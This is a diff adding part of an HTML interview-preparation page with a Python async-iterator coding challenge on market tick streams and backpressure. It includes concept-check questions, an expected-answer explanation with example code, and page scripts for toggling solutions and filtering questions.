+                            <div class="section-title">💻 3. Code Challenge</div>
+                            <button class="btn-view-code" onclick="openCodeSnippetModal('20', 'async_tick_stream.py')">
+                                💻 View Code Snippet (Popup)
+                            </button>
+                            <div id="snippet-20" style="display:none;">import asyncio
+from typing import AsyncIterator, Optional
+from dataclasses import dataclass
+
+@dataclass
+class MarketTick:
+    symbol: str
+    price: float
+    timestamp: float
+
+class AsyncTickStream:
+    def __init__(self, max_buffer_size: int = 100):
+        # Bounded queue ensures memory cannot grow unbounded
+        self.queue: asyncio.Queue[Optional[MarketTick]] = asyncio.Queue(maxsize=max_buffer_size)
+        self.is_active = True
+
+    def __aiter__(self) -&gt; AsyncIterator[MarketTick]:
+        return self
+
+    async def __anext__(self) -&gt; MarketTick:
+        if not self.is_active and self.queue.empty():
+            raise StopAsyncIteration
+            
+        tick = await self.queue.get()
+        if tick is None:
+            raise StopAsyncIteration
+            
+        return tick</div>
+                        </div>
+
+                        <!-- 1-4 Answer Quality Rating Panel -->
+                        <div class="question-rating-panel">
+                            <span class="rating-panel-label">🎯 Answer Quality:</span>
+                            <div class="star-rating-group" id="star-group-20">
+                                <button class="star-btn" data-rating="1" onclick="setQuestionRating('python_core', 20, 1, 'Asynchronous Iterators & Reactive Backpressure: Implementing custom async iterators with __aiter__ and __anext__, managi')">
+                                    <span class="star-num">1</span>
+                                    <span class="star-label">Cannot Explain</span>
+                                </button>
+                                <button class="star-btn" data-rating="2" onclick="setQuestionRating('python_core', 20, 2, 'Asynchronous Iterators & Reactive Backpressure: Implementing custom async iterators with __aiter__ and __anext__, managi')">
+                                    <span class="star-num">2</span>
+                                    <span class="star-label">Partial</span>
+                                </button>
+                                <button class="star-btn" data-rating="3" onclick="setQuestionRating('python_core', 20, 3, 'Asynchronous Iterators & Reactive Backpressure: Implementing custom async iterators with __aiter__ and __anext__, managi')">
+                                    <span class="star-num">3</span>
+                                    <span class="star-label">Good</span>
+                                </button>
+                                <button class="star-btn" data-rating="4" onclick="setQuestionRating('python_core', 20, 4, 'Asynchronous Iterators & Reactive Backpressure: Implementing custom async iterators with __aiter__ and __anext__, managi')">
+                                    <span class="star-num">4</span>
+                                    <span class="star-label">Expert</span>
+                                </button>
+                            </div>
+                            <span class="q-score-display" id="q-score-20">Not Rated</span>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">🔍 4. Concept Check Evaluation</div>
+                            <ul class="concept-check-list">
+                                <li>Does candidate articulate the async iterator protocol: <code>__aiter__</code> returns an object implementing <code>__anext__</code>, which returns an awaitable that yields a value or raises <code>StopAsyncIteration</code>?</li>
+<li>Do they explain backpressure: when buffer fills up, <code>queue.put()</code> pauses the producer coroutine until consumer catches up?</li>
+<li>Do they handle graceful shutdown by pushing sentinel values (e.g. <code>None</code>) to unblock consumers?</li>
+<li>Do they discuss trade-offs between blocking the producer vs dropping stale frames (sampling) in market tick feeds?</li>
+                            </ul>
+                        </div>
+
+                        <!-- Collapsible Solution Drawer -->
+                        <button class="solution-toggle" onclick="toggleSolution(this)">
+                            <span>💡 5. Expected Senior / Lead Answer &amp; Architecture Trade-offs</span>
+                            <span>▼</span>
+                        </button>
+                        <div class="solution-content">
+                            <div class="solution-heading">Answer Key &amp; Deep-Dive Explanation</div>
+                            <strong>1. Asynchronous Iterator Protocol:</strong><br>
+In Python, <code>async for item in async_iterable:</code> evaluates:<br>
+1. <code>iter_obj = async_iterable.__aiter__()</code>.<br>
+2. Repeatedly awaits <code>await iter_obj.__anext__()</code>.<br>
+3. Catches <code>StopAsyncIteration</code> to cleanly exit the loop without error.<br><br>
+<strong>2. Backpressure & Flow Control:</strong><br>
+Without backpressure, an unbounded queue will consume all available system RAM if a network producer generates 10,000 msgs/sec while a database consumer processes 1,000 msgs/sec. A bounded <code>asyncio.Queue(maxsize=N)</code> applies natural backpressure: when the buffer is full, <code>await queue.put(item)</code> suspends the producer coroutine, preventing buffer bloat.<br><br>
+<strong>3. Complete Production Pattern:</strong><br>
+<pre><code>import asyncio
+from typing import Optional
+
+class MarketDataFeed:
+    def __init__(self, buffer_size: int = 500):
+        self.queue = asyncio.Queue(maxsize=buffer_size)
+        self.running = True
+
+    async def publish_tick(self, tick: MarketTick) -> None:
+        # Suspends if consumer is slow; enforces backpressure
+        await self.queue.put(tick)
+
+    async def shutdown(self) -> None:
+        self.running = False
+        # Sentinel unblocks waiting consumers
+        await self.queue.put(None)
+
+    async def __aiter__(self):
+        while True:
+            item = await self.queue.get()
+            if item is None:
+                break
+            yield item
+            self.queue.task_done()</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Code Snippet Modal -->
+    <div id="codeModal" class="code-modal">
+        <div class="modal-backdrop" onclick="closeCodeSnippetModal()"></div>
+        <div class="modal-dialog">
+            <div class="modal-header">
+                <h3 id="codeModalTitle">💻 Code Challenge</h3>
+                <button class="modal-close-btn" onclick="closeCodeSnippetModal()">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="modal-code-wrapper">
+                    <pre><code id="codeModalPre"></code></pre>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn-outline" onclick="closeCodeSnippetModal()">Close</button>
+                <button class="btn-primary" id="copyCodeBtn" onclick="copyModalCode()">📋 Copy Code to Clipboard</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="js/interview-tracker.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            initTopicPage('python_core');
+        });
+
+        function toggleSolution(button) {
+            const content = button.nextElementSibling;
+            if (content.classList.contains('show')) {
+                content.classList.remove('show');
+                button.querySelector('span:last-child').textContent = '▼';
+            } else {
+                content.classList.add('show');
+                button.querySelector('span:last-child').textContent = '▲';
+            }
+        }
+
+        function filterQuestions() {
+            const input = document.getElementById('searchInput').value.toLowerCase();
+            const cards = document.querySelectorAll('.question-card');
+
+            cards.forEach(card => {
+                const text = card.textContent.toLowerCase();
+                const keywords = card.getAttribute('data-keywords') || '';
+                if (text.includes(input) || keywords.includes(input)) {
+                    card.style.display = 'block';
+                } else {
+                    card.style.display = 'none';
+                }
+            });
+        }
+    </script>
+</body>
+</html>
